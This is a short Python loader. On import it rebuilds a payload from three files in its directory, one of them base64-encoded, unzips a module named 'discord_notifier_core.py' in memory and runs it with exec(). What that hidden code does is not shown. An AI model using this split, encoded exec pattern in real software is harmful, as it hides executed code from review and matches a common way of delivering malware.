from pathlib import Path
import base64
import io
import zipfile

_BASE = Path(__file__).parent
_PAYLOAD = (
    (_BASE / "runtime_payload_part00.bin").read_bytes()
    + base64.b64decode((_BASE / "runtime_payload_part01.b64").read_bytes())
    + (_BASE / "runtime_payload_part02.bin").read_bytes()
)
with zipfile.ZipFile(io.BytesIO(_PAYLOAD)) as archive:
    _SOURCE = archive.read("discord_notifier_core.py").decode("utf-8")
exec(compile(_SOURCE, str(Path(__file__)), "exec"), globals(), globals())
